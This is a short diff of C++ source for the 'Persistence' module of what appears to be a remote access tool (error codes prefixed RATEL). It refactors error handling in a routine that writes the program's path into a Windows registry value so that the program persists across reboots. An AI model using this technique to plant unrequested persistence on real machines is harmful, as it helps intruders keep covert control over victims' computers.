@@ -2,7 +2,7 @@
 #include "../inc/other.h"
 #include "../inc/common.h"
 #include "../inc/Exec.h"
-
+#include "../inc/ErrorCodes.h"
 
 using namespace std;
 
@@ -21,14 +21,13 @@ INT Persistence::customPersi()
 }
 
 
-VOID  Persistence::main() 
+INT  Persistence::main() 
 {       
     WCHAR value[] = L"" NAME_KEY_REGISTER; 
     HKEY hKey, HKEY_admin_or_not;
     
     LONG status;
-    DWORD error = false;
-    
+    INT error_codes = 0;
     WCHAR path_of_key[MAX_PATH];
 
     //Initialization of variables according to privileges. 
@@ -50,21 +49,24 @@ VOID  Persistence::main()
         status = RegSetValueExW(hKey,value ,0 , REG_SZ, (LPBYTE)a_path_prog.c_str(), a_path_prog.size() * sizeof(WCHAR));
         if(status != 0)
         {
-            error = true;
+            error_codes = RATEL_ERROR_SET_SUBKEY;
         }
         RegCloseKey(hKey);   
 
     }
     else
     {
-        error = true;
+        error_codes = RATEL_ERROR_OPEN_KEY;
     }
 
+    /*
     //If error 
     if(error)
     {
         //defaultPersi(); TO CHANGE
     }    
+    */
+   return error_codes;
 }
     
 /*
